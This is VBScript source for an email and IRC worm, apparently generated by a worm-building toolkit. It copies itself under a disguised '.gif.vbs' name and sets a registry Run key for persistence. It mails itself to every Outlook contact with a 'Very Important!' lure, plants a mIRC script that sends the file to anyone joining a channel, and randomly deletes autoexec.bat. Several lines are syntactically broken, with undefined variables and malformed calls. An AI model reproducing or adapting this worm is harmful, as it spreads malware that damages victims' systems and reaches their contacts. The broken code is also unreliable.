   'EMM made by: PetiK.
   set pU6kemy76J = createobject("scripting.filesystemobject")
   mN6aqwi11K = pU6kemy76J.getspecialfolder(1)
   tI4skrm17G = mN6aqwi11K & "\emm.gif.vbs"
   set cY2phvh79E = createobject("wscript.shell")
   cY2phvh79E.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\emm", "wscript.exe "& mN6aqwi11K & " %"
   pU6kemy76J.copyfile wscript.scriptfullname, tI4skrm17G
   Function pO7rrtg54M()
   Set fK6grop7B = CreateObject("Outlook.Application")
   If fK6grop7B = "Outlook" Then
   Set dG3ohuw52J = fK6grop7B.GetNameSpace("MAPI")
   Set aG1qyhg87D = dG3ohuw52J.AddressLists
   For Each oP6rvcj82G In aG1qyhg87D
   If oP6rvcj82G.AddressEntries.Count <> 0 Then
   qJ8kufs89F = oP6rvcj82G.AddressEntries.Count
   For yY8nqld64P = 1 To qJ8kufs89F
   Set vJ0mbjl29Y = fK6grop7B.CreateItem(0)
   Set aQ6narh98H = oP6rvcj82G.AddressEntries(yY8nqld64P)
   vJ0mbjl29Y.To = aQ6narh98H.Address
   vJ0mbjl29Y.Subject = "Very Important!"
   vJ0mbjl29Y.Body = "Hello, Please view this file, it is very important.Thanks!"
   execute "set jI3forg57O = vJ0mbjl29Y." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
   yX2utkp49M = tI4skrm17G
   vJ0mbjl29Y.DeleteAfterSubmit = True
   jI3forg57O.Add yX2utkp49M
   If vJ0mbjl29Y.To <> "" Then
   vJ0mbjl29Y.Send
   End If
   Next
   End If
   Next
   End If
   End function
   Function jD6dejc61R(dY1orcq73T)
   If dY1orcq73T <> "" Then
   kC4obkc14H = cY2phvh79E.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   If pU6kemy76J.fileexists("c:\mirc\mirc.ini") Then
   dY1orcq73T = "c:\mirc"
   ElseIf pU6kemy76J.fileexists("c:\mirc32\mirc.ini") Then
   dY1orcq73T = "c:\mirc32"
   ElseIf pU6kemy76J.fileexists(kC4obkc14H & "\mirc\mirc.ini") Then
   dY1orcq73T = kC4obkc14H & "\mirc"
   ElseIf pU6kemy76J.fileexists(kC4obkc14H & "\mirc32\mirc.ini") Then
   dY1orcq73T = kC4obkc14H & "\mirc"
   Else
   dY1orcq73T = ""
   End If
   End If
   If dY1orcq73T<>""Then
   Set yP2klbl43X = pU6kemy76J.CreateTextFile(dY1orcq73T & "\script.ini", True)
   yP2klbl43X = "[script]" &  vbCrLf & "n0=on 1:JOIN:#:{"
   yP2klbl43X = yP2klbl43X & vbCrLf & "n0=on 1:JOIN:#:{"
   yP2klbl43X = yP2klbl43X & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
   yP2klbl43X = yP2klbl43X & vbCrLf & "n2=  /."& Chr(100) & Chr(99) & Chr(99) & " send $nick "
   yP2klbl43X = yP2klbl43X & tI4skrm17G
   yP2klbl43X = yP2klbl43X & vbCrLf & "n3=}"
   script.Close
   End If
   Function HR1S72EF()
   On Error Resume Next
   Set A5O14007 = pU6kemy76J.Drives
   For Each FJSL26BF In A5O14007
   M816T4QH = FJSL26BF&"\"
   Call JT0F7SFG(M816T4QH)
   Next
   End function
   Function JT0F7SFG(D66I2D27)
   OT2016KI = D66I2D27
   Set GJF6856R = pU6kemy76J.GetFolder(OT2016KI)
   Set E9DOP13B = GJF6856R.Files
   For Each L3D1T217 In E9DOP13B
   if lcase(iW4fvbd96U = "mirc.ini" then
   jD6dejc61R(iW4fvbd96U.parentfolder)
   end if
   Next
   Set uY2qpyk5V = gX4sjfp55L.Subfolders
   For Each eG6jnwn95TIn uY2qpyk5V
   Call (eG6jnwn95T.path)
   Next
   End function
   hB4loah13I
   Function hB4loah13I()
   If 1 + Int(Rnd * 9) = 10 then
   cY2phvh79E.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","PetiK"
   pU6kemy76J.deletefile "c:\autoexec.bat"
   cY2phvh79E.run "net send * Hello!", 7, false
   end if
   end function
   'Made with Visual Basic Worm Toolbox, which is a (psyence) software production
